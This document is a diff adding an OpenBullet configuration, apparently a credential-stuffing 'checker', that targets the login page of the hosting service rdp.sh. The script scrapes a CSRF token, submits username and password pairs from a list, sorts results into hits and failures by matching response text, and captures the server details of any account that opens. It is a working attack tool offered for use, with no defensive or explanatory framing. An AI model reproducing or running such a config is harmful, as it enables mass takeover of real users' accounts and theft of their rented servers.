@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "RDP.SH",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-23T22:24:13.1919259+00:00",
+  "AdditionalInfo": "",
+  "Author": "Solux",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "USER1" 
+REQUEST GET "https://rdp.sh/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://rdp.sh/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+PARSE "<SOURCE>" LR "csrf-token\" content=\"" "\"" -> VAR "CSRF" 
+REQUEST POST "https://rdp.sh/login" 
+  CONTENT "_token=<CSRF>&email=<USER1>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://rdp.sh" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://rdp.sh/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "These credentials do not match our records.</strong>" 
+  KEYCHAIN Success OR 
+    KEY "\">Dashboard</div" 
+PARSE "<SOURCE>" LR "alert alert-info\">" "</div>" -> CAP "Servers" 
